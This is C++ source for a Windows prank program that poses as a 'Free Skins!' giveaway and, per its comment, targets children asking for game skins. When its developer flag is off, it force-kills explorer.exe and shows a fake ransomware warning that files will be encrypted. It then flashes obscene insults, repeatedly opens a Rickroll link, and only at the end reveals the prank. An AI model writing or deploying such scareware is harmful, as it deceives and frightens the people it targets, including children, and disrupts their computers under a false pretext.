#include <stdio.h>                         
#include <string.h>
#include <fstream>
#include <Windows.h>
#include <shellapi.h>
#include <iostream>
#include <random>

#define _CRT_SECURE_NO_WARNINGS

//This is harmless, but to the 9 year old in rift, their pc is fucked.

bool bDeveloper = true; //don't forget to change 
HANDLE Console = GetStdHandle(STD_OUTPUT_HANDLE);

int TimesRan = 0;

int RandomInt(int min = 1, int max = 100)
{
	//https://stackoverflow.com/questions/13445688/how-to-generate-a-random-number-in-c
	std::random_device dev;
	std::mt19937 rng(dev());
	std::uniform_int_distribution<std::mt19937::result_type> dist6(min, max);

	return dist6(rng);
}

std::vector<std::string> Insults = {
	"FATTY",
	"IDIOT",
	"BOZO",
	"POOPY HEAD",
	"CUNT",
	"CUMSOCK"
};

std::string GetRandomInsult()
{
	while (true)
	{
		int Idx = RandomInt(1, Insults.size()) - 1;
		std::string Insult = Insults[Idx];

		auto rng = std::default_random_engine{};
		std::shuffle(Insults.begin(), Insults.end(), rng);

		return Insult;
	}
}

void SpamShit()
{
	auto str = GetRandomInsult();
	char* cstr = &str[0];

	char Command[256];

	strncpy(Command, "title GET FUCKED ", sizeof(Command));
	strncat(Command, cstr, sizeof(Command));

	system(Command);
	system("cls");

LoadShit:

	TimesRan++;
	int color1 = RandomInt(1, 15);
	int color2 = RandomInt(1, 15);

	SetConsoleTextAttribute(Console, color1);
	std::cout << "GET FUCKED LMFAOO\n\n";
	SetConsoleTextAttribute(Console, color2);
	std::cout << "NEXT TIME DON'T ASK FOR SKINS\n\n";
	SetConsoleTextAttribute(Console, color1);
	std::cout << "INJECTED CODE: " << RandomInt(0, 956) << "\n\n";

	if (!bDeveloper)
		ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);

	Sleep(250);
	system("cls");

	if (TimesRan >= 40)
		MessageBoxA(nullptr, "You Have Been Trolled:) Your Computer Is Actually Fine But Don't Be Annoying Asking For Skins. To Recover Your Desktop Run 'explorer.exe' (can be done in task manager)", "BOZO", MB_OK);
	else
		goto LoadShit;
}

int main()
{
	system("title Free Skins!");
	if (!bDeveloper)
	{
		system("taskkill /IM explorer.exe /F");
		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
	}
	int FakeCode = RandomInt(1, 956) * 14;
	system("color 0C");
	std::cout << "INJECTING CODE: " << FakeCode << "\n";
	Sleep(500);
	std::cout << "INJECTED CODE: " << FakeCode << "\n";
	Sleep(500);
	SpamShit();
	return 0;
}
